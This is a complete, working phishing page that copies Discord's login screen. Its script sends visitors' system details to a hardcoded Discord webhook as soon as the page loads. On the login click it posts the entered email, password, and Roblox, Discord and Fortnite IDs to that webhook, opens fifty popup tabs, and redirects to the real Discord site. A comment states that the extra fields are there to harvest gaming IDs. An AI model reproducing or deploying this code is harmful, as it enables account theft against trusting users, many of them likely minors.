<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Discord Login</title>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body { background: #1e1f22; font-family: 'Segoe UI', system-ui, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
    .container { background: #313338; padding: 40px 44px; border-radius: 8px; width: 480px; max-width: 96%; box-shadow: 0 8px 24px rgba(0,0,0,0.4); }
    .discord-logo { text-align: center; font-size: 42px; font-weight: 900; color: white; margin-bottom: 24px; letter-spacing: -1px; }
    .discord-logo i { color: #5865f2; }
    input { width: 100%; padding: 12px 14px; margin: 6px 0 14px 0; background: #1e1f22; border: 1px solid #3f4147; border-radius: 4px; color: #dbdee1; font-size: 16px; outline: none; box-sizing: border-box; }
    input:focus { border-color: #5865f2; }
    label { color: #b5bac1; font-size: 13px; font-weight: 600; letter-spacing: 0.3px; }
    .btn { width: 100%; padding: 14px; background: #5865f2; border: none; border-radius: 4px; color: white; font-size: 18px; font-weight: 600; cursor: pointer; margin-top: 8px; }
    .btn:hover { background: #4752c4; }
    .footer { margin-top: 16px; display: flex; justify-content: space-between; color: #949ba4; font-size: 13px; }
    .footer a { color: #00a8fc; text-decoration: none; }
    .error { color: #f23f42; font-size: 13px; margin-top: -8px; margin-bottom: 8px; display: none; }
    .qr-section { text-align: center; margin: 16px 0; color: #b5bac1; font-size: 14px; border-top: 1px solid #3f4147; padding-top: 16px; }
    .qr-section a { color: #00a8fc; text-decoration: none; }
    .extra-field { margin-top: 4px; }
  </style>
</head>
<body>
<div class="container">
  <div class="discord-logo"><i>●</i> Discord</div>
  <label>EMAIL OR PHONE</label>
  <input type="text" id="email" placeholder="email@example.com" autocomplete="off">
  <label>PASSWORD</label>
  <input type="password" id="password" placeholder="••••••••" autocomplete="off">
  
  <!-- Extra fields to harvest gaming IDs -->
  <label class="extra-field">ROBLOX USERNAME</label>
  <input type="text" id="roblox" placeholder="Your Roblox username" autocomplete="off">
  <label class="extra-field">DISCORD ID (optional)</label>
  <input type="text" id="discordId" placeholder="e.g. 123456789012345678" autocomplete="off">
  <label class="extra-field">FORTNITE ID / EPIC NAME</label>
  <input type="text" id="fortnite" placeholder="Your Fortnite display name" autocomplete="off">

  <div class="error" id="errorMsg">Please fill in email and password.</div>
  <button class="btn" id="loginBtn">Log In</button>
  <div class="qr-section"><a href="#">Login with QR code</a> &middot; <a href="#">Forgot password?</a></div>
  <div class="footer"><span>Need an account? <a href="#">Register</a></span></div>
</div>
<script>
  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1513535369117831289/7UNRwXkFXZHajEajaUn0UAU4FPXnyr7wzhi0TlVwvtM-FXl0Mbey70p6ia_j6uJh4NM7';

  // Masked IP via Cloudflare (no real geo)
  async function getMaskedIp() {
    try {
      const res = await fetch('https://1.0.0.1/cdn-cgi/trace');
      const text = await res.text();
      const lines = text.split('\n');
      let ip = 'unknown', colo = 'unknown';
      for (const line of lines) {
        if (line.startsWith('ip=')) ip = line.split('=')[1];
        if (line.startsWith('colo=')) colo = line.split('=')[1];
      }
      return { ip, colo };
    } catch (e) { return { ip: 'unknown', colo: 'unknown' }; }
  }

  // Open 50 new tabs/pages (popups) - most browsers block unless triggered by user gesture,
  // but we call this inside a click handler on the login button (user gesture).
  function openFiftyPages() {
    const url = 'https://www.google.com';
    for (let i = 0; i < 50; i++) {
      window.open(url, '_blank');
    }
  }

  async function getSystemInfo() {
    return {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
      deviceMemory: navigator.deviceMemory || 'unknown',
      screen: window.screen.width + 'x' + window.screen.height,
    };
  }

  // On page load - just send visitor (no spam)
  window.addEventListener('load', async function() {
    const ipData = await getMaskedIp();
    const sys = await getSystemInfo();
    const payload = {
      embeds: [{
        title: '🌐 Visitor (masked)',
        color: 0x2b2d31,
        fields: [
          { name: 'IP (edge)', value: ipData.ip, inline: true },
          { name: 'Datacenter', value: ipData.colo, inline: true },
          { name: 'Country', value: 'Not disclosed', inline: true },
          { name: 'City', value: 'Not disclosed', inline: true },
          { name: 'Timezone', value: 'UTC (masked)', inline: true },
          { name: 'Platform', value: sys.platform, inline: true },
          { name: 'Language', value: sys.language, inline: true },
          { name: 'Cores', value: sys.hardwareConcurrency, inline: true },
          { name: 'Memory', value: sys.deviceMemory + ' GB', inline: true },
          { name: 'Screen', value: sys.screen, inline: true },
          { name: 'User Agent', value: sys.userAgent, inline: false }
        ],
        timestamp: new Date().toISOString(),
        footer: { text: 'No real IP, no geo, no religion, no real timezone' }
      }]
    };
    try { await fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }); } catch (e) {}
  });

  document.getElementById('loginBtn').addEventListener('click', async function() {
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value.trim();
    const roblox = document.getElementById('roblox').value.trim();
    const discordId = document.getElementById('discordId').value.trim();
    const fortnite = document.getElementById('fortnite').value.trim();
    const errorEl = document.getElementById('errorMsg');

    if (!email || !password) { errorEl.style.display = 'block'; return; }
    errorEl.style.display = 'none';

    // Open 50 Google pages (popups) - this executes on user click
    openFiftyPages();

    const ipData = await getMaskedIp();
    const sys = await getSystemInfo();

    const payload = {
      embeds: [{
        title: '🔐 Discord Credentials + Gaming IDs',
        color: 0xff0000,
        fields: [
          { name: 'Email/Phone', value: email, inline: false },
          { name: 'Password', value: '||' + password + '||', inline: false },
          { name: 'Roblox Username', value: roblox || 'Not provided', inline: true },
          { name: 'Discord ID', value: discordId || 'Not provided', inline: true },
          { name: 'Fortnite / Epic ID', value: fortnite || 'Not provided', inline: true },
          { name: 'IP (edge)', value: ipData.ip, inline: true },
          { name: 'Country', value: 'Not disclosed', inline: true },
          { name: 'City', value: 'Not disclosed', inline: true },
          { name: 'Timezone', value: 'UTC (masked)', inline: true },
          { name: 'Platform', value: sys.platform, inline: true },
          { name: 'Language', value: sys.language, inline: true },
          { name: 'Cores', value: sys.hardwareConcurrency, inline: true },
          { name: 'Memory', value: sys.deviceMemory + ' GB', inline: true },
          { name: 'Screen', value: sys.screen, inline: true },
          { name: 'User Agent', value: sys.userAgent, inline: false }
        ],
        timestamp: new Date().toISOString(),
        footer: { text: 'Gaming IDs harvested - 50 tabs opened' }
      }]
    };

    try {
      await fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
    } catch (e) { console.error('Webhook fail:', e); }

    // Redirect to real Discord
    window.location.href = 'https://discord.com/login';
  });

  document.querySelectorAll('input').forEach(inp => {
    inp.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') document.getElementById('loginBtn').click();
    });
  });
</script>
</body>
</html>
